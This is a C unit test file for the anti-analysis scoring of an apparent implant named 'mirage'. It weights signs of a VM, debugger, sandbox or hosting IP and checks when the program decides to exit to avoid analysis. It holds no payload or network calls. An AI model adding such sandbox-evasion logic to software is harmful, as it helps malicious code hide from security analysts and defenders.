/*
 * test_scoring.c — Anti-analysis scoring logic tests (no Win32 runtime needed)
 * Tests the scoring math and threshold logic from anti_analysis.c
 *
 * Uses real types from anti_analysis.h and real should_exit function.
 * Local compute_score() uses simplified weights for unit testing.
 */
#include <assert.h>
#include <stdio.h>
#include <string.h>
#include "anti_analysis.h"
#include "config.h"

/* Use real should_exit from anti_analysis.c */
extern int mirage_anti_analysis_should_exit(mirage_analysis_result result);

/* ── Scoring helper using real types ────────────────────────────── */
/* Uses simplified weights for unit testing (not the real production weights) */

static mirage_analysis_result compute_score(int ram_mb, int cores, int screen_w,
                                      int disk_gb, int uptime_min,
                                      int has_debugger, int has_vm_reg,
                                      int is_hosting, int has_sandbox_proc) {
    mirage_analysis_result r = {0};
    if (ram_mb < 4096) { r.score += 15; r.flags.ram_low = 1; }
    if (cores < 2) { r.score += 15; r.flags.cpu_few = 1; }
    if (has_vm_reg) { r.score += 20; r.flags.vm_registry = 1; }
    if (has_debugger) { r.score += 25; r.flags.debugger = 1; }
    if (screen_w < 800) { r.score += 10; r.flags.small_screen = 1; }
    if (disk_gb < 60) { r.score += 10; r.flags.disk_small = 1; }
    if (uptime_min < 10) { r.score += 10; r.flags.uptime_low = 1; }
    if (is_hosting == 1) { r.score += 25; r.flags.hosting_ip = 1; }
    if (has_sandbox_proc) { r.score += 30; r.flags.sandbox_proc = 1; }
    return r;
}

/* ═════════════════════ TESTS ═════════════════════════════════════════ */

static void test_clean_system(void) {
    mirage_analysis_result r = compute_score(8192, 4, 1920, 500, 3600, 0, 0, 0, 0);
    assert(r.score == 0);
    assert(r.flags.ram_low == 0);
    printf("  PASS: test_clean_system\n");
}

static void test_low_ram(void) {
    mirage_analysis_result r = compute_score(2048, 4, 1920, 500, 3600, 0, 0, 0, 0);
    assert(r.score == 15);
    assert(r.flags.ram_low == 1);
    printf("  PASS: test_low_ram\n");
}

static void test_few_cores(void) {
    mirage_analysis_result r = compute_score(8192, 1, 1920, 500, 3600, 0, 0, 0, 0);
    assert(r.score == 15);
    assert(r.flags.cpu_few == 1);
    printf("  PASS: test_few_cores\n");
}

static void test_vm_registry(void) {
    mirage_analysis_result r = compute_score(8192, 4, 1920, 500, 3600, 0, 1, 0, 0);
    assert(r.score == 20);
    assert(r.flags.vm_registry == 1);
    printf("  PASS: test_vm_registry\n");
}

static void test_debugger_detected(void) {
    mirage_analysis_result r = compute_score(8192, 4, 1920, 500, 3600, 1, 0, 0, 0);
    assert(r.score == 25);
    assert(r.flags.debugger == 1);
    printf("  PASS: test_debugger_detected\n");
}

static void test_hosting_ip(void) {
    mirage_analysis_result r = compute_score(8192, 4, 1920, 500, 3600, 0, 0, 1, 0);
    assert(r.score == 25);
    assert(r.flags.hosting_ip == 1);
    printf("  PASS: test_hosting_ip\n");
}

static void test_sandbox_processes(void) {
    mirage_analysis_result r = compute_score(8192, 4, 1920, 500, 3600, 0, 0, 0, 1);
    assert(r.score == 30);
    assert(r.flags.sandbox_proc == 1);
    printf("  PASS: test_sandbox_processes\n");
}

static void test_combined_indicators_below_threshold(void) {
    mirage_analysis_result r = compute_score(2048, 1, 1920, 30, 3600, 0, 0, 0, 0);
    assert(r.score == 40);
    assert(mirage_anti_analysis_should_exit(r) == 0);
    printf("  PASS: test_combined_below_threshold\n");
}

static void test_combined_indicators_above_threshold(void) {
    mirage_analysis_result r = compute_score(8192, 4, 1920, 500, 3600, 1, 1, 1, 1);
    assert(r.score == 100);
    assert(mirage_anti_analysis_should_exit(r) == 1);
    printf("  PASS: test_combined_above_threshold\n");
}

static void test_exact_threshold(void) {
    mirage_analysis_result r = compute_score(8192, 4, 799, 500, 3600, 1, 0, 1, 1);
    assert(r.score == 90);
    assert(mirage_anti_analysis_should_exit(r) == 1);
    printf("  PASS: test_exact_threshold\n");
}

static void test_just_below_threshold(void) {
    mirage_analysis_result r = compute_score(8192, 4, 1920, 500, 3600, 1, 0, 1, 1);
    assert(r.score == 80);
    assert(mirage_anti_analysis_should_exit(r) == 0);
    printf("  PASS: test_just_below_threshold\n");
}

static void test_max_score_all_flags(void) {
    mirage_analysis_result r = compute_score(1024, 1, 640, 10, 1, 1, 1, 1, 1);
    assert(r.score == 15+15+20+25+10+10+10+25+30);
    assert(r.flags.ram_low && r.flags.cpu_few && r.flags.vm_registry);
    assert(r.flags.debugger && r.flags.hosting_ip && r.flags.sandbox_proc);
    printf("  PASS: test_max_score_all_flags\n");
}

int main(void) {
    printf("=== test_scoring: anti-analysis scoring logic ===\n");
    test_clean_system();
    test_low_ram();
    test_few_cores();
    test_vm_registry();
    test_debugger_detected();
    test_hosting_ip();
    test_sandbox_processes();
    test_combined_indicators_below_threshold();
    test_combined_indicators_above_threshold();
    test_exact_threshold();
    test_just_below_threshold();
    test_max_score_all_flags();
    printf("=== test_scoring: ALL PASSED ===\n");
    return 0;
}
